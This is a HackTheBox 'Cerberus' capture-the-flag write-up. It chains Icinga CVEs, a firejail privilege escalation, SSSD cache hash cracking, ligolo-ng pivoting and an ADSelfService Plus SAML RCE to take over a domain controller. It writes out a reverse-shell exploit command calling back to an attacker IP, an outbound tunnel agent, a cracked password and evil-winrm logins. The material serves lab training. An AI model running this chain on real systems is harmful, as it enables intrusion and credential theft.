
# HackTheBox - Cerberus

## NMAP

```bash
Nmap scan report for 10.10.11.205
Host is up (0.093s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
```

Visiting the webserver on port 8080, it will redirect us to `icinga.cerberus.local`

<img src="https://i.imgur.com/JQmCtfj.png"/>

Adding domain in `/etc/hosts` file

<img src="https://i.imgur.com/xDcPSkJ.png"/>

## PORT 8080 (HTTP)


<img src="https://i.imgur.com/4benXut.png"/>

Trying Icinga default creds `icingaadmin:icing` but it failed

<img src="https://i.imgur.com/E3Zw8C2.png"/>

Looking for exploits realted to icinga2, there's Arbitrary File Disclosure (CVE-2022-24716)
https://github.com/JacobEbben/CVE-2022-24716/blob/main/exploit.py

The webserver is hosted on ubuntu, we check from the server response

<img src="https://i.imgur.com/Pe82pnD.png"/>

<img src="https://i.imgur.com/T2TuezS.png"/>
We can get the db credes for icingaweb2 which allowed us to login to icinga dashboard as `matthew`

<img src="https://i.imgur.com/L6rgJEz.png"/>

<img src="https://i.imgur.com/p8cUern.png"/>

We can use the CVE-2022-24715 for getting a reverse shell, before using that we need to generate pem file

https://github.com/JacobEbben/CVE-2022-24715

<img src="https://i.imgur.com/RVOwJud.png"/>

```bash
python3 ./RCE.py -t http://icinga.cerberus.local:8080/icingaweb2 -I 10.10.14.98 -P 2222 -u 'matthew' -p 'IcingaWebPassword2023' -e ./id_rsa
```

<img src="https://i.imgur.com/dqnO9dY.png"/>
Checking the `/etc/hosts` file there's a host `DC.cerberus.local` on `172.16.22.1`

<img src="https://i.imgur.com/BBVCm6g.png"/>

To pivot, we can use `ligolo-ng` for that we need to do a little setup for setting up the interface

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.22.0/24 dev ligolo
```

Then on attacking machine run `proxy`

```bash
./proxy -selfcert
```

<img src="https://i.imgur.com/Wncr3gR.png"/>

And on target machine run the `agent`

```bash
agent -connect 10.10.14.98:11601 -ignore-cert -retry
```

<img src="https://i.imgur.com/ZYVqhWu.png"/>

After running agent, we'll get a connection on our machine

<img src="https://i.imgur.com/n9Cunpz.png"/>

Scanning for common ports on dc it only showed port 5985 (WinRM) open on the machine 

<img src="https://i.imgur.com/diSEjgU.png"/>

Running linpeas, it showed `firejail` showing as unknown SUID binary

<img src="https://i.imgur.com/o0LYPaR.png"/>

Searching for firejail exploits there's a CVE for local privilege escalation `CVE-2022-31214`

https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25

<img src="https://i.imgur.com/TgVTzfp.png"/>

With root user we have read access to `/etc/krb5.keytab`

<img src="https://i.imgur.com/w9jtnsK.png"/>

But we can't really do anything with this account, from the linpeas we also see something about `SSSD` which is System Security Services Daemon that handles kerberos tickets on linux

<img src="https://i.imgur.com/OEEAYib.png"/>

Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the "ccache". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.[[3]](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in `/var/lib/sss/secrets/secrets.ldb` as well as the corresponding key located in `/var/lib/sss/secrets/.secrets.mkey`. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)

But there wasn't any `/var/lib/sss/secrets/.secrets.mkey` file on the linux machine instead on researching where the AD cached credentials or hashes might be, I found a metasploit module which was explaning how it gathers the AD credentials on a linux machine 

<img src="https://i.imgur.com/4NIEkQn.png"/>

So here we have the cache file

<img src="https://i.imgur.com/KUq36Hh.png"/>

We can transfer this on our machine and run `tdbdump` on it 

<img src="https://i.imgur.com/RzQJdlI.png"/>
```
tbdump ./cache_cerberus.local.ldb
```

<img src="https://i.imgur.com/nugf4vN.png"/>

Here we can find the hash for matthew user

```
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
```

Which gets cracked to `147258369`

<img src="https://i.imgur.com/aYby4d8.png"/>

Having the DC's port 5985 accessible through ligolo-ng we can try authenticating with matthew user 

```
evil-winrm -i 172.16.22.1  -u 'matthew' -p '147258369'
```

<img src="https://i.imgur.com/1FwzUOE.png"/>

And we have gotten access to DC as matthew user, going into C:\Users directory, there's an ADFS service account so we might be dealing with SAML or something

<img src="https://i.imgur.com/jrvi3BG.png"/>

Transferring and running `sharphound.exe` to enumerate the domain

<img src="https://i.imgur.com/qI89RBz.png"/>

Through evil-winrm we can use `download` to transfer the zip file on our machine

<img src="https://i.imgur.com/qu7coMB.png"/>

Uploading the json files to bloodhound-GUI

<img src="https://i.imgur.com/ShQGlMA.png"/>

But from bloodhound I didn't see a path leading to anywhere, pivoting from the dc machine as only port 5985 was exposed so maybe there will be other services running on the dc

<img src="https://i.imgur.com/wPV3i0z.png"/>

Now scanning the DC's IP

<img src="https://i.imgur.com/xkbsAA2.png"/>

We can see port 8888 open, Accessing port 8888 it redirects to port 9521 and then redirects to `dc.cerberus.local`

<img src="https://i.imgur.com/EneMJtE.png"/>

<img src="https://i.imgur.com/1vJoS2S.png"/>

<img src="https://i.imgur.com/XqF8EJW.png"/>

This After logging in with matthew's creds it's going to redirect us to `dc`, 

<img src="https://i.imgur.com/lC73MYe.png"/>

So adding dc in hosts file as well 

<img src="https://i.imgur.com/8Njna2I.png"/>

this brings us ADSelfService Plus but we are not authorized to view anything here and ADSelfService  is designed to help IT administrators enable end-users to reset forgotten passwords, unlock their accounts, and update their personal information in Active Directory (AD) without the need for IT assistance.

There's a CVE on ADSelfService for remote code execution (CVE 2022-47966)

<img src="https://i.imgur.com/4TgJzwJ.png"/>

https://github.com/horizon3ai/CVE-2022-47966

For the issuer URL, we can find about it from this article

https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-fed-saml-idp

<img src="https://i.imgur.com/j97Bdwc.png"/>

In this scenario the issuer url is `http://dc.cerberus.local/adfs/services/trust`. now I tried running the python script but for some reason it didn't worked and I couldn't understand why this wasn't working

<img src="https://i.imgur.com/JIF3PS2.png"/>

So instead using the metasploit module
https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/

<img src="https://i.imgur.com/xj2nJ9C.png"/>


<img src="https://i.imgur.com/Urz6Bkh.png"/>

<img src="https://i.imgur.com/C2TaRE6.png"/>

Now we can dump ntds by either transferring mimikatz or just creating a new administrator user and dumping the creds through seceretsdump (this is just an extra step, there's no need for doing this as you already have gotten a shell as SYSTEM user)

<img src="https://i.imgur.com/yUGMQtw.png"/>

<img src="https://i.imgur.com/EYdwvyB.png"/>

<img src="https://i.imgur.com/JkVcptR.png"/>

Having the administrator's hash we can perform `pass the hash` to get a shell as the administrator through winrm

<img src="https://i.imgur.com/l97UTsk.png"/>

## References

- https://github.com/JacobEbben/CVE-2022-24716/blob/main/exploit.py
- https://github.com/Icinga/icingaweb2/security/advisories/GHSA-v9mv-h52f-7g63
- https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py
- https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
- https://attack.mitre.org/techniques/T1558/
- https://support.robinpowered.com/hc/en-us/articles/215174126-Enabling-single-sign-on-via-ADFS
- https://github.com/horizon3ai/CVE-2022-47966
- https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/

